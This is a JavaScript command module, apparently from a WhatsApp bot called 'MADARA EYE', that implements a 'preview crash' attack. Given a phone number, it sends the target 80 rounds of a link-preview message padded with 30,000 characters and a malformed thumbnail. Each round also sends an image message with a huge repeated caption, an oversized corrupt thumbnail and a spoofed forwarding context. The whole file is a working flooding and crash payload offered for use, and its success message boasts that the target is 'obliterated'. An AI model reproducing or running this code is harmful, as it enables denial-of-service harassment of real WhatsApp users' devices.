'use strict';
const { MadaraEye } = require('../../lib/madaraEye');
const { createProgressBar } = require('../../lib/progressBar');

module.exports = {
    name: 'preview',
    aliases: ['linkpreview', 'previewloop', 'imgcrash'],
    category: 'madaraeye',
    desc: 'ʟɪɴᴋ + ɪᴍᴀɢᴇ ᴘʀᴇᴠɪᴇᴡ ᴄʀᴀsʜ — ᴅᴜᴀʟ ᴘᴀʏʟᴏᴀᴅ',
    usage: '.preview <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}preview <number>\n📝 *Example:* ${prefix}preview 2348012345678` 
            }, { quoted: msg });
        }
        
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        let eye = global.getMadaraEye?.(sock);
        if (!eye) {
            eye = new MadaraEye(sock);
        }
        
        const TOTAL = 80;
        const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
        
        const urls = [
            "https://d.top4top.io/p_3829n9zbt1.jpg",
            "https://c.top4top.io/p_3829tp8hx1.jpg",
            "https://e.top4top.io/p_38291dfw01.jpg",
            "https://f.top4top.io/p_3829cp2gn1.jpg",
            "https://g.top4top.io/p_3829i30lz1.jpg"
        ];
        
        try {
            for (let i = 0; i < TOTAL; i++) {
                const url = urls[i % urls.length];
                
                // ── Attack 1: Link preview message ──────────────────────
                await sock.sendMessage(target, {
                    text: `https://t.me/madaraeye\nMADARA EYE ${i}\n${'x'.repeat(30000)}`,
                    linkPreview: {
                        "matched-text": "https://t.me/madaraeye",
                        title: "MADARA EYE",
                        description: "© MADARA X-MD INC.",
                        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/' + 'A'.repeat(10000), 'base64'),
                    }
                }).catch(() => {});
                
                // ── Attack 2: Corrupted image with massive caption ──────
                await sock.sendMessage(target, {
                    image: { url },  // Real image URL forces fetch + render
                    caption: 'MADARA EYE'.repeat(5000),
                    jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/' + 'B'.repeat(50000), 'base64'),
                    contextInfo: {
                        mentionedJid: [target],
                        forwardingScore: 999,
                        isForwarded: true,
                    }
                }).catch(() => {});
                
                await bar.update(1, 'ʟɪɴᴋ + ɪᴍᴀɢᴇ ᴄʀᴀsʜ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
            }
            
            await bar.done(`✅ ᴅᴜᴀʟ ᴘʀᴇᴠɪᴇᴡ ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL * 2}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
        } catch (e) {
            await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
        }
    }
};